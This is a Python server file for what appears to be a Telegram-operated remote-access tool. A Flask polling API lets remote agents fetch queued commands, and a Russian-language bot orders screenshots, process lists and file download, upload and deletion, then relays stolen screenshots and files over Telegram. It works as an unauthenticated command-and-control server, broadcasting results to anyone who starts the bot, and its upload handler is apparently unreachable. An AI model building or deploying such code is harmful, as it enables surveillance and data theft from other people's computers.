# server/Bot_poll.py
# Server: Telegram bot + Flask API + SQLite queue (polling model)
import os, time, threading, sqlite3, base64, io
from flask import Flask, request, jsonify
from telebot import TeleBot, types
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
if not TOKEN:
    print("Set TOKEN in .env")
    exit(1)
DB_PATH = os.path.join(os.path.dirname(__file__), "data.db")
API_PORT = int(os.getenv("API_PORT", "5000"))

# --- DB helpers ---
def get_conn():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id INTEGER UNIQUE,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )""")
    cur.execute("""CREATE TABLE IF NOT EXISTS computers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        computer_hash TEXT UNIQUE,
        last_seen DATETIME,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )""")
    cur.execute("""CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        computer_hash TEXT,
        command TEXT,
        payload TEXT,
        status TEXT DEFAULT 'pending',  -- pending, running, done, failed
        result TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME
    )""")
    conn.commit()
    conn.close()

# --- Flask API used by agents ---
app = Flask(__name__)

@app.route("/poll", methods=["POST"])
def poll():
    """Agent polls with its computer_hash: returns list of pending commands"""
    data = request.json or {}
    ch = data.get("computer_hash")
    if not ch:
        return jsonify({"success": False, "message": "no computer_hash"}), 400
    conn = get_conn()
    cur = conn.cursor()
    # ensure computer exists
    cur.execute("INSERT OR IGNORE INTO computers (computer_hash, last_seen) VALUES (?, datetime('now'))", (ch,))
    cur.execute("UPDATE computers SET last_seen = datetime('now') WHERE computer_hash = ?", (ch,))
    # fetch pending commands
    cur.execute("SELECT id, command, payload FROM commands WHERE computer_hash = ? AND status = 'pending' ORDER BY id", (ch,))
    rows = cur.fetchall()
    commands = []
    ids = []
    for r in rows:
        commands.append({"id": r["id"], "command": r["command"], "payload": r["payload"]})
        ids.append(r["id"])
    # mark as running
    if ids:
        cur.executemany("UPDATE commands SET status = 'running', updated_at = datetime('now') WHERE id = ?", [(i,) for i in ids])
        conn.commit()
    conn.close()
    return jsonify({"success": True, "commands": commands})

@app.route("/result", methods=["POST"])
def result():
    """Agent posts back result of a command"""
    data = request.json or {}
    cid = data.get("id")
    status = data.get("status")  # done / failed
    result = data.get("result")
    if cid is None:
        return jsonify({"success": False, "message": "no id"}), 400
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("UPDATE commands SET status = ?, result = ?, updated_at = datetime('now') WHERE id = ?", (status, result, cid))
    conn.commit()
    conn.close()
    return jsonify({"success": True})

# --- Telegram bot for admin / users ---
bot = TeleBot(TOKEN, parse_mode="HTML")

# temporary in-memory state for multi-step actions: {chat_id: {"action":..., "computer_hash":...}}
states = {}

def ensure_user(chat_id):
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO users (telegram_id) VALUES (?)", (chat_id,))
    conn.commit()
    conn.close()

def get_user_computers(chat_id):
    # list computers known in DB (all); for simplicity show all, user picks by hash
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT computer_hash, last_seen FROM computers ORDER BY last_seen DESC")
    rows = cur.fetchall()
    conn.close()
    return rows

@bot.message_handler(commands=['start','help'])
def cmd_start(m):
    ensure_user(m.chat.id)
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("📱 Устройства", "🖥️ Система", "📁 Файлы")
    bot.send_message(m.chat.id, "Добро пожаловать. Выберите пункт.", reply_markup=kb)

@bot.message_handler(func=lambda msg: msg.text=="📱 Устройства")
def menu_devices(m):
    rows = get_user_computers(m.chat.id)
    if not rows:
        bot.send_message(m.chat.id, "Пока нет зарегистрированных устройств. Попросите пользователя запустить агент.", reply_markup=None)
        return
    kb = types.InlineKeyboardMarkup()
    for r in rows:
        kb.add(types.InlineKeyboardButton(f"{r['computer_hash'][:12]}... last {r['last_seen']}", callback_data=f"select:{r['computer_hash']}"))
    bot.send_message(m.chat.id, "Выберите устройство:", reply_markup=kb)

@bot.callback_query_handler(lambda c: c.data and c.data.startswith("select:"))
def on_select_device(call):
    ch = call.data.split(":",1)[1]
    states[call.message.chat.id] = {"computer_hash": ch}
    bot.answer_callback_query(call.id, "Устройство выбрано")
    bot.send_message(call.message.chat.id, f"Выбранное устройство: <code>{ch}</code>\nДалее: 🖥️ Система / 📁 Файлы", reply_markup=None)

# System menu
@bot.message_handler(func=lambda msg: msg.text=="🖥️ Система")
def menu_system(m):
    st = states.get(m.chat.id)
    if not st:
        bot.send_message(m.chat.id, "Сначала выберите устройство: 📱 Устройства", reply_markup=None)
        return
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("📸 Скриншот", "💻 Инфо", "🔄 Процессы", "🔙 Назад")
    bot.send_message(m.chat.id, "Системные команды:", reply_markup=kb)

@bot.message_handler(func=lambda msg: msg.text=="📸 Скриншот")
def cmd_screenshot(m):
    st = states.get(m.chat.id); 
    if not st: return bot.send_message(m.chat.id, "Выберите устройство.")
    ch = st["computer_hash"]
    conn = get_conn(); cur = conn.cursor()
    cur.execute("INSERT INTO commands (computer_hash, command, payload) VALUES (?, 'screenshot', '')", (ch,))
    cid = cur.lastrowid
    conn.commit(); conn.close()
    bot.send_message(m.chat.id, "Команда отправлена. Подождите...")

@bot.message_handler(func=lambda msg: msg.text=="💻 Инфо")
def cmd_info(m):
    st = states.get(m.chat.id); 
    if not st: return bot.send_message(m.chat.id, "Выберите устройство.")
    ch = st["computer_hash"]
    conn = get_conn(); cur = conn.cursor()
    cur.execute("INSERT INTO commands (computer_hash, command, payload) VALUES (?, 'system_info', '')", (ch,))
    cid = cur.lastrowid
    conn.commit(); conn.close()
    bot.send_message(m.chat.id, "Запрошена информация о системе. Подождите...")

@bot.message_handler(func=lambda msg: msg.text=="🔄 Процессы")
def cmd_procs(m):
    st = states.get(m.chat.id); 
    if not st: return bot.send_message(m.chat.id, "Выберите устройство.")
    ch = st["computer_hash"]
    conn = get_conn(); cur = conn.cursor()
    cur.execute("INSERT INTO commands (computer_hash, command, payload) VALUES (?, 'processes', '')", (ch,))
    cid = cur.lastrowid
    conn.commit(); conn.close()
    bot.send_message(m.chat.id, "Запрошены процессы. Подождите...")

# Files menu
@bot.message_handler(func=lambda msg: msg.text=="📁 Файлы")
def menu_files(m):
    st = states.get(m.chat.id)
    if not st:
        bot.send_message(m.chat.id, "Сначала выберите устройство.")
        return
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("📂 Список", "⬇️ Скачать", "⬆️ Загрузить", "🗑️ Удалить", "🔙 Назад")
    bot.send_message(m.chat.id, "Файловые операции:", reply_markup=kb)

# For simple operations that require a path we use in-memory prompt
@bot.message_handler(func=lambda msg: msg.text in ["📂 Список","⬇️ Скачать","🗑️ Удалить"])
def ask_path(m):
    st = states.get(m.chat.id)
    if not st: return bot.send_message(m.chat.id, "Выберите устройство.")
    states[m.chat.id].update({"pending": m.text})  # remember which action
    bot.send_message(m.chat.id, "Введите путь (например C:\\\\Users\\\\Public)")

@bot.message_handler(func=lambda msg: True)
def handle_text(m):
    # handle path input for file actions
    st = states.get(m.chat.id)
    if not st:
        return
    pending = st.get("pending")
    if not pending:
        return
    ch = st["computer_hash"]
    path = m.text.strip()
    conn = get_conn(); cur = conn.cursor()
    if pending == "📂 Список":
        cur.execute("INSERT INTO commands (computer_hash, command, payload) VALUES (?, 'list_files', ?)", (ch, path))
        bot.send_message(m.chat.id, "Запрошен список файлов...")
    elif pending == "⬇️ Скачать":
        cur.execute("INSERT INTO commands (computer_hash, command, payload) VALUES (?, 'download', ?)", (ch, path))
        bot.send_message(m.chat.id, "Запрошен файл. Как только агент пришлёт результат, я отправлю его вам.")
    elif pending == "🗑️ Удалить":
        cur.execute("INSERT INTO commands (computer_hash, command, payload) VALUES (?, 'delete', ?)", (ch, path))
        bot.send_message(m.chat.id, "Запрошено удаление файла.")
    conn.commit(); conn.close()
    # clear pending
    states[m.chat.id].pop("pending", None)

# Upload: ask user to send file, then ask for target path
@bot.message_handler(func=lambda msg: msg.text=="⬆️ Загрузить")
def upload_start(m):
    st = states.get(m.chat.id)
    if not st: return bot.send_message(m.chat.id, "Выберите устройство.")
    states[m.chat.id].update({"pending_upload": True})
    bot.send_message(m.chat.id, "Отправьте файл в чат (как документ). После этого введите путь на удалённом ПК, куда сохранить (например C:\\\\Users\\\\Public\\\\file.txt).")

@bot.message_handler(content_types=['document'])
def received_document(m):
    st = states.get(m.chat.id)
    if not st or not st.get("pending_upload"):
        return
    # download the file bytes
    file_info = bot.get_file(m.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    # store in state until user provides path
    states[m.chat.id].update({"upload_bytes": downloaded, "upload_name": m.document.file_name})
    bot.send_message(m.chat.id, f"Файл <b>{m.document.file_name}</b> получен. Теперь введите путь на удалённом ПК для сохранения:")

@bot.message_handler(func=lambda msg: True)
def upload_target_path(m):
    st = states.get(m.chat.id)
    if not st or not st.get("pending_upload") or not st.get("upload_bytes"):
        return
    target = m.text.strip()
    ch = st["computer_hash"]
    b = st["upload_bytes"]
    name = st["upload_name"]
    # encode base64
    payload_b64 = base64.b64encode(b).decode()
    payload = {"target_path": target, "name": name, "file_b64": payload_b64}
    conn = get_conn(); cur = conn.cursor()
    cur.execute("INSERT INTO commands (computer_hash, command, payload) VALUES (?, 'upload', ?)", (ch, str(payload)))
    conn.commit(); conn.close()
    bot.send_message(m.chat.id, "Задание на загрузку файла отправлено агенту.")
    # clear upload state
    states[m.chat.id].pop("pending_upload", None)
    states[m.chat.id].pop("upload_bytes", None)
    states[m.chat.id].pop("upload_name", None)

# Background thread: check for completed results and send to users
def poll_results():
    while True:
        conn = get_conn(); cur = conn.cursor()
        cur.execute("SELECT id, computer_hash, command, result FROM commands WHERE status = 'done' OR status = 'failed'")
        rows = cur.fetchall()
        for r in rows:
            cid = r["id"]; cmd = r["command"]; res = r["result"]
            # find users (for simplicity, we broadcast to all users)
            cur2 = conn.cursor()
            cur2.execute("SELECT telegram_id FROM users")
            users = cur2.fetchall()
            for u in users:
                try:
                    if cmd == "screenshot" and res:
                        # res is base64 image
                        img = base64.b64decode(res)
                        bot.send_photo(u["telegram_id"], img, caption=f"📸 Скриншот ({r['computer_hash'][:12]})")
                    elif cmd == "download" and res:
                        # res is dict-like string maybe, could contain file b64 and name
                        import ast
                        payload = ast.literal_eval(res)
                        file_b64 = payload.get("file_b64")
                        name = payload.get("name","file.bin")
                        data = base64.b64decode(file_b64)
                        bot.send_document(u["telegram_id"], io.BytesIO(data), visible_file_name=name)
                    else:
                        # generic text result
                        bot.send_message(u["telegram_id"], f"Результат {cmd} ({r['computer_hash'][:12]}):\n{res}")
                except Exception as e:
                    print("Send error", e)
            # mark as processed (so we don't resend) -> we could keep history; here we delete
            cur.execute("DELETE FROM commands WHERE id = ?", (cid,))
            conn.commit()
        conn.close()
        time.sleep(3)

# run Flask and bot
def run_flask():
    app.run(host="0.0.0.0", port=API_PORT)

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    init_db()
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=poll_results, daemon=True).start()
    print("Server started")
    run_bot()
